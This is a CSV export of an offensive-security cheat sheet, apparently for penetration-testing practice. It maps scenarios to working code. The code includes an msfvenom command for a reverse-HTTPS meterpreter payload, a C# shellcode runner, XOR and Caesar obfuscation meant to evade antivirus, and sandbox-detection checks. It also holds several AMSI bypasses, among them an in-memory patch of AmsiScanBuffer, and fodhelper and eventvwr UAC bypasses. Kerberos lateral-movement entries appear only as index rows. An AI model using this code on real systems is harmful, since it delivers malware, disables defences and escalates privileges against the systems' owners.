"cheatsheet_id","command_id","context","scenario_title","section_title","example","shows"
"shellcode-runner-evasion","csharp-shellcode-runner-basic","scenario","Scenario 1: Msfvenom Payload Caught by Defender (Basic Runner)","","",""
"shellcode-runner-evasion","csharp-xor-encrypt","scenario","Scenario 1: Msfvenom Payload Caught by Defender (Basic Runner)","","",""
"shellcode-runner-evasion","compile-csharp-runner","scenario","Scenario 1: Msfvenom Payload Caught by Defender (Basic Runner)","","",""
"shellcode-runner-evasion","csharp-caesar-encrypt","scenario","Scenario 2: Advanced Evasion (Multi-Layer Encryption)","","",""
"shellcode-runner-evasion","csharp-xor-encrypt","scenario","Scenario 2: Advanced Evasion (Multi-Layer Encryption)","","",""
"shellcode-runner-evasion","csharp-shellcode-runner-basic","scenario","Scenario 2: Advanced Evasion (Multi-Layer Encryption)","","",""
"shellcode-runner-evasion","csharp-sleep-timer","scenario","Scenario 2: Advanced Evasion (Multi-Layer Encryption)","","",""
"shellcode-runner-evasion","compile-csharp-runner","scenario","Scenario 2: Advanced Evasion (Multi-Layer Encryption)","","",""
"shellcode-runner-evasion","csharp-non-emulated-api","scenario","Scenario 3: Sandbox Detection (NUMA API & Resource Checks)","","",""
"shellcode-runner-evasion","csharp-sleep-timer","scenario","Scenario 3: Sandbox Detection (NUMA API & Resource Checks)","","",""
"shellcode-runner-evasion","csharp-shellcode-runner-basic","scenario","Scenario 3: Sandbox Detection (NUMA API & Resource Checks)","","",""
"shellcode-runner-evasion","compile-csharp-runner","scenario","Scenario 3: Sandbox Detection (NUMA API & Resource Checks)","","",""
"shellcode-runner-evasion","msfvenom-csharp-payload","scenario","Scenario 4: Production Compilation (End-to-End Workflow)","","",""
"shellcode-runner-evasion","csharp-xor-encrypt","scenario","Scenario 4: Production Compilation (End-to-End Workflow)","","",""
"shellcode-runner-evasion","csharp-non-emulated-api","scenario","Scenario 4: Production Compilation (End-to-End Workflow)","","",""
"shellcode-runner-evasion","csharp-shellcode-runner-basic","scenario","Scenario 4: Production Compilation (End-to-End Workflow)","","",""
"shellcode-runner-evasion","compile-csharp-runner","scenario","Scenario 4: Production Compilation (End-to-End Workflow)","","",""
"shellcode-runner-evasion","msfvenom-csharp-payload","section","","Phase 1: Shellcode Generation","msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f csharp","Shellcode byte array in C# format:
byte[] buf = new byte[..."
"shellcode-runner-evasion","csharp-shellcode-runner-basic","section","","Phase 2: Basic Runner Framework","using System;
using System.Runtime.InteropServices;

namespace ShellcodeRunner {
    class Program {
        [DllImport(""kernel32"")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport(""kernel32"")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
        
        [DllImport(""kernel32"")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
        
        static void Main(string[] args) {
            byte[] buf = new byte[] { 0xfc,0x48,0x83,0xe4,0xf0 };
            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);
            Marshal.Copy(buf, 0, addr, buf.Length);
            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}","No console output. Shellcode executes (e.g., reverse shel..."
"shellcode-runner-evasion","compile-csharp-runner","section","","Phase 2: Basic Runner Framework","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:runner.exe Program.cs","runner.exe created in current directory. No output = succ..."
"shellcode-runner-evasion","csharp-caesar-encrypt","section","","Phase 3: Encryption Layers","// ENCRYPTION (offline)
byte[] buf = new byte[] { 0xfc,0x48,0x83 };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
}
// Print encoded array
Console.WriteLine(""byte[] encoded = new byte[] { "" + string.Join("","", encoded.Select(b => $""0x{b:X2}"")) + "" };"");

// DECRYPTION (runtime in runner)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
}","Encrypted runner bypasses static signatures. Shellcode ex..."
"shellcode-runner-evasion","csharp-xor-encrypt","section","","Phase 3: Encryption Layers","// ENCRYPTION (offline)
byte[] buf = new byte[] { 0xfc,0x48,0x83 };
byte[] encoded = new byte[buf.Length];
for(int i = 0; i < buf.Length; i++) {
    encoded[i] = (byte)((uint)buf[i] ^ 0xAA);
}

// DECRYPTION (runtime - same operation)
for(int i = 0; i < buf.Length; i++) {
    buf[i] = (byte)((uint)buf[i] ^ 0xAA);
}","XOR encrypted payload bypasses more signatures than Caesa..."
"shellcode-runner-evasion","csharp-non-emulated-api","section","","Phase 4: Sandbox Evasion","using System;
using System.Runtime.InteropServices;

[DllImport(""kernel32.dll"", SetLastError = true, ExactSpelling = true)]
static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

[DllImport(""kernel32.dll"")]
static extern IntPtr GetCurrentProcess();

// Sandbox check
IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
if(mem == null) {
    return; // Sandbox detected - API not emulated
}
// Continue with payload","In sandbox: Exits (NULL returned). On real system: Contin..."
"shellcode-runner-evasion","csharp-sleep-timer","section","","Phase 4: Sandbox Evasion","using System;
using System.Threading;

DateTime t1 = DateTime.Now;
Thread.Sleep(10000);
double deltaT = DateTime.Now.Subtract(t1).TotalSeconds;
if(deltaT < 9.5) {
    return; // Sandbox detected - exit
}
// Continue with payload execution","In sandbox: Exits immediately (sandbox detected). On real..."
"shellcode-runner-evasion","compile-csharp-runner","section","","Phase 5: Final Compilation","C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:runner.exe Program.cs","runner.exe created in current directory. No output = succ..."
"amsi-bypass-methodology","amsi-test-payload","scenario","Scenario 1: PowerShell Download Cradle (AMSI Blocks IEX)","","",""
"amsi-bypass-methodology","amsi-context-corruption","scenario","Scenario 1: PowerShell Download Cradle (AMSI Blocks IEX)","","",""
"amsi-bypass-methodology","amsi-memory-patch","scenario","Scenario 1: PowerShell Download Cradle (AMSI Blocks IEX)","","",""
"amsi-bypass-methodology","amsi-init-failed","scenario","Scenario 1: PowerShell Download Cradle (AMSI Blocks IEX)","","",""
"amsi-bypass-methodology","amsi-test-payload","scenario","Scenario 2: Meterpreter Post-Exploitation (AMSI Flags Scripts)","","",""
"amsi-bypass-methodology","amsi-init-failed","scenario","Scenario 2: Meterpreter Post-Exploitation (AMSI Flags Scripts)","","",""
"amsi-bypass-methodology","amsi-base64-staging","scenario","Scenario 2: Meterpreter Post-Exploitation (AMSI Flags Scripts)","","",""
"amsi-bypass-methodology","amsi-memory-patch","scenario","Scenario 2: Meterpreter Post-Exploitation (AMSI Flags Scripts)","","",""
"amsi-bypass-methodology","amsi-jscript-registry","scenario","Scenario 3: WSH/JScript Macro Delivery (AMSI Blocks WSH)","","",""
"amsi-bypass-methodology","amsi-test-payload","scenario","Scenario 3: WSH/JScript Macro Delivery (AMSI Blocks WSH)","","",""
"amsi-bypass-methodology","amsi-test-payload","section","","Phase 1: Detection & Testing","'Invoke-Mimikatz'","String echoes back without red 'This script contains mali..."
"amsi-bypass-methodology","amsi-context-corruption","section","","Phase 2: Quick Bypasses (In-Memory)","[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*Context'}|%{[IntPtr]$ptr=$_.GetValue($null);[System.Runtime.InteropServices.Marshal]::Copy([BitConverter]::GetBytes(0),0,$ptr,4)}}","No output indicates success. Subsequent AMSI checks will ..."
"amsi-bypass-methodology","amsi-init-failed","section","","Phase 2: Quick Bypasses (In-Memory)","[Ref].Assembly.GetTypes()|?{$_.Name-like'*iUtils'}|%{$_.GetFields('NonPublic,Static')|?{$_.Name-like'*InitFailed'}|%{$_.SetValue($null,$true)}}","No output. AMSI will report initialization failure and sk..."
"amsi-bypass-methodology","amsi-memory-patch","section","","Phase 2: Quick Bypasses (In-Memory)","$Win32=@""
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport(""kernel32"")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport(""kernel32"")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport(""kernel32"")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
""@
Add-Type $Win32
$lib=[Win32]::LoadLibrary(""amsi.dll"")
$addr=[Win32]::GetProcAddress($lib,""AmsiScanBuffer"")
$p=0
[Win32]::VirtualProtect($addr,[uint32]5,0x40,[ref]$p)
$patch=[Byte[]](0x48,0x31,0xC0,0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($patch,0,$addr,4)","[+] AMSI patched successfully (if using verbose version)...."
"amsi-bypass-methodology","amsi-jscript-registry","section","","Phase 3: Persistent/Alternative Bypasses","var sh = new ActiveXObject(""WScript.Shell"");
var key = ""HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable"";
try {
    var val = sh.RegRead(key);
    if(val != 0) {
        sh.RegWrite(key, 0, ""REG_DWORD"");
    }
} catch(e) {
    sh.RegWrite(key, 0, ""REG_DWORD"");
}
WScript.Echo(""AMSI disabled for WSH"");","Registry key set, AMSI disabled for current user's WSH se..."
"amsi-bypass-methodology","amsi-base64-staging","section","","Phase 3: Persistent/Alternative Bypasses","powershell -EncodedCommand [BASE64_BYPASS]","Bypass executes silently from encoded payload. Test with ..."
"amsi-bypass-methodology","amsi-test-payload","section","","Phase 4: Validation","'Invoke-Mimikatz'","String echoes back without red 'This script contains mali..."
"uac-bypass-techniques","check-integrity-level","scenario","Scenario 1: FodHelper UAC Bypass (Windows 10 17134+)","","",""
"uac-bypass-techniques","fodhelper-uac-bypass","scenario","Scenario 1: FodHelper UAC Bypass (Windows 10 17134+)","","",""
"uac-bypass-techniques","check-integrity-level","scenario","Scenario 1: FodHelper UAC Bypass (Windows 10 17134+)","","",""
"uac-bypass-techniques","check-integrity-level","scenario","Scenario 2: EventVwr UAC Bypass (Broader Compatibility)","","",""
"uac-bypass-techniques","eventvwr-uac-bypass","scenario","Scenario 2: EventVwr UAC Bypass (Broader Compatibility)","","",""
"uac-bypass-techniques","check-integrity-level","scenario","Scenario 2: EventVwr UAC Bypass (Broader Compatibility)","","",""
"uac-bypass-techniques","uac-bypass-detection","scenario","Scenario 3: UAC Bypass Detection & Cleanup","","",""
"uac-bypass-techniques","check-integrity-level","scenario","Scenario 3: UAC Bypass Detection & Cleanup","","",""
"uac-bypass-techniques","check-integrity-level","section","","Phase 1: Detection & Validation","whoami /groups | findstr /i ""Mandatory Label""","Low: Mandatory Label\Low Mandatory Level
Medium: Mandator..."
"uac-bypass-techniques","fodhelper-uac-bypass","section","","Phase 2: Bypass Execution","# Create registry structure
New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value ""cmd /c start powershell.exe"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\fodhelper.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\ms-settings\"" -Recurse -Force","Payload executes with high integrity (admin) without UAC ..."
"uac-bypass-techniques","eventvwr-uac-bypass","section","","Phase 2: Bypass Execution","# Create registry key
New-Item ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\mscfile\shell\open\command"" -Name ""(default)"" -Value ""cmd /c start powershell.exe"" -Force

# Trigger UAC bypass
Start-Process ""C:\Windows\System32\eventvwr.exe"" -WindowStyle Hidden

# Cleanup
Start-Sleep -Seconds 3
Remove-Item ""HKCU:\Software\Classes\mscfile\"" -Recurse -Force","EventVwr opens, payload executes with high integrity. Eve..."
"uac-bypass-techniques","check-integrity-level","section","","Phase 3: Post-Exploitation & Cleanup","whoami /groups | findstr /i ""Mandatory Label""","Low: Mandatory Label\Low Mandatory Level
Medium: Mandator..."
"uac-bypass-techniques","uac-bypass-detection","section","","Phase 3: Post-Exploitation & Cleanup","# Test registry creation (no trigger)
New-Item ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Force
New-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""DelegateExecute"" -Value """" -Force
Set-ItemProperty -Path ""HKCU:\Software\Classes\ms-settings\Shell\Open\command"" -Name ""(default)"" -Value ""cmd /c echo test"" -Force

Write-Host ""Registry keys created. Check for AV alerts...""
Start-Sleep 10

# Cleanup
Remove-Item ""HKCU:\Software\Classes\ms-settings\"" -Recurse -Force
Write-Host ""Cleaned up. No AV alert = bypass likely undetected.""","No AV alert = Bypass likely undetected. AV alert = Need a..."
"ad-kerberos-lateral-movement","overpass-mimikatz-pth","scenario","Scenario 1: Understanding Kerberos vs. NTLM Authentication (Why Upgrade Hash to Ticket?)","","",""
"ad-kerberos-lateral-movement","kerberos-klist-verify","scenario","Scenario 1: Understanding Kerberos vs. NTLM Authentication (Why Upgrade Hash to Ticket?)","","",""
"ad-kerberos-lateral-movement","overpass-mimikatz-pth","scenario","Scenario 2: Overpass-the-Hash with Mimikatz (NTLM to TGT Conversion)","","",""
"ad-kerberos-lateral-movement","overpass-net-use-trigger","scenario","Scenario 2: Overpass-the-Hash with Mimikatz (NTLM to TGT Conversion)","","",""
"ad-kerberos-lateral-movement","kerberos-klist-verify","scenario","Scenario 2: Overpass-the-Hash with Mimikatz (NTLM to TGT Conversion)","","",""
"ad-kerberos-lateral-movement","psexec-sysinternals-interactive","scenario","Scenario 2: Overpass-the-Hash with Mimikatz (NTLM to TGT Conversion)","","",""
"ad-kerberos-lateral-movement","kerberos-rubeus-asktgt","scenario","Scenario 3: Rubeus Alternative to Mimikatz (AV Evasion)","","",""
"ad-kerberos-lateral-movement","kerberos-rubeus-ptt","scenario","Scenario 3: Rubeus Alternative to Mimikatz (AV Evasion)","","",""
